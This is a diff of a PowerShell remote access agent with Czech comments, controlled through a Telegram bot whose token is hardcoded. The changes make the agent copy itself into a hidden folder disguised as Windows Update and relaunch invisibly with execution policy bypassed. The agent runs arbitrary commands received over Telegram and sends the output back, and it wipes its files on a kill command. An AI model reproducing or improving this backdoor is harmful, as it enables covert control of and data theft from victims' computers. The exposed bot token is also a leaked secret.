@@ -4,12 +4,57 @@
 
 $botToken = '8510265210:AAH9HMaiR1ineEhf4SHtZBCaiO1HBPbcYTw'
 
-# UMÍSTĚNÍ SOUBORŮ - TEMP složka (vždy funguje)
-$agentFolder = $env:TEMP
-$stateFile = "$agentFolder\.msupdate_state"
-$logFile = "$agentFolder\.msupdate_log"
+# SKRYTÁ SLOŽKA - vypadá jako Windows Update
+$targetFolder = "$env:LOCALAPPDATA\Microsoft\WindowsUpdate"
+$targetScript = "$targetFolder\WuUpdate.ps1"
+$stateFile = "$targetFolder\.state"
+$logFile = "$targetFolder\.log"
 
 $chatId = $null
+
+# FUNKCE: Vytvoř skrytou složku a zkopíruj se tam
+function Install-Agent {
+    try {
+        # Vytvoř složku pokud neexistuje
+        if(!(Test-Path $targetFolder)) {
+            New-Item -ItemType Directory -Path $targetFolder -Force | Out-Null
+            Write-Host "Slozka vytvorena: $targetFolder"
+        }
+        
+        # Nastav Hidden atribut
+        $folder = Get-Item $targetFolder -Force
+        $folder.Attributes = $folder.Attributes -bor [System.IO.FileAttributes]::Hidden
+        
+        # Zkontroluj jestli už agent není nainstalovaný
+        $currentPath = $MyInvocation.PSCommandPath
+        
+        if($currentPath -ne $targetScript) {
+            Write-Host "Kopiruji agenta do: $targetScript"
+            
+            # Zkopíruj celý tento skript do cílové složky
+            Copy-Item -Path $PSCommandPath -Destination $targetScript -Force
+            
+            # Spusť kopii
+            Start-Process powershell -WindowStyle Hidden -ArgumentList "-ExecutionPolicy Bypass -File `"$targetScript`""
+            
+            Write-Host "Agent nainstalovany, spoustim kopii..."
+            exit
+        } else {
+            Write-Host "Agent uz bezi z cilove slozky: $targetScript"
+        }
+        
+    } catch {
+        Write-Host "ERROR pri instalaci: $_"
+        # Pokud selže, pokračuj z aktuálního místa
+    }
+}
+
+# Pokud agent neběží z cílové složky, nainstaluj ho
+if($PSCommandPath -ne $targetScript) {
+    Install-Agent
+}
+
+# TEPRVE TEĎ spusť normální funkce agenta
 
 function Write-Log($msg) {
     $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
@@ -61,7 +106,6 @@ function Save-State {
 }
 
 function Clean-Text($text) {
-    # Odstranit všechny non-ASCII znaky a nahradit je '?'
     $text = $text -replace '[^\x00-\x7F]','?'
     return $text
 }
@@ -74,10 +118,7 @@ function Send-Message($text) {
     
     Write-Log "Odesilam zpravu do chatId=$chatId"
     
-    # Vyčisti text od problematických znaků
     $text = Clean-Text $text
-    
-    # Escape JSON znaky
     $text = $text -replace '\\','\\' -replace '"','\"' -replace "`n",'\n' -replace "`r",''
     
     $json = "{`"chat_id`":`"$chatId`",`"text`":`"$text`"}"
@@ -152,33 +193,35 @@ while($true) {
                 }
             } elseif($cmd -eq '/files') {
                 $info = "Umisteni souboru:`n"
+                $info += "Agent: $targetScript`n"
                 $info += "State: $stateFile`n"
                 $info += "Log: $logFile`n`n"
-                $info += "Slozka: $agentFolder"
+                $info += "Slozka: $targetFolder (Hidden)"
                 Send-Message $info
             } elseif($cmd -eq '/kill') {
                 Write-Log "Ukoncuji se..."
                 Send-Message "Agent se ukoncuje..."
                 
-                # Smaž soubory
+                # Smaž všechny soubory
+                Remove-Item $targetScript -Force -ErrorAction SilentlyContinue
                 Remove-Item $stateFile -Force -ErrorAction SilentlyContinue
                 Remove-Item $logFile -Force -ErrorAction SilentlyContinue
+                
+                # Pokus se smazat složku (pokud je prázdná)
+                Remove-Item $targetFolder -Force -ErrorAction SilentlyContinue
                 
                 exit
             } else {
                 Write-Log "Vykonavani prikazu: $cmd"
                 Send-Message "[EXECUTING] $cmd"
                 try {
-                    # Ulož výstup do dočasného souboru
                     $tempFile = [System.IO.Path]::GetTempFileName()
                     
-                    # Spusť příkaz a ulož do souboru
                     cmd /c "$cmd > `"$tempFile`" 2>&1"
                     $exitCode = $LASTEXITCODE
                     
                     Write-Log "Prikaz dokoncen s exit code: $exitCode"
                     
-                    # Načti soubor
                     if(Test-Path $tempFile) {
                         $output = Get-Content $tempFile -Raw -Encoding Default
                         Remove-Item $tempFile -Force
@@ -186,7 +229,6 @@ while($true) {
                         $output = ""
                     }
                     
-                    # Vyčisti output
                     $output = Clean-Text $output
                     $output = $output.Trim()
                     
@@ -206,7 +248,7 @@ while($true) {
             }
         }
     } catch {
-        Write-Log "ERROR ve smycke: $_"
+        Write-Log "ERROR ve smycce: $_"
         Start-Sleep -Seconds 5
     }
 }
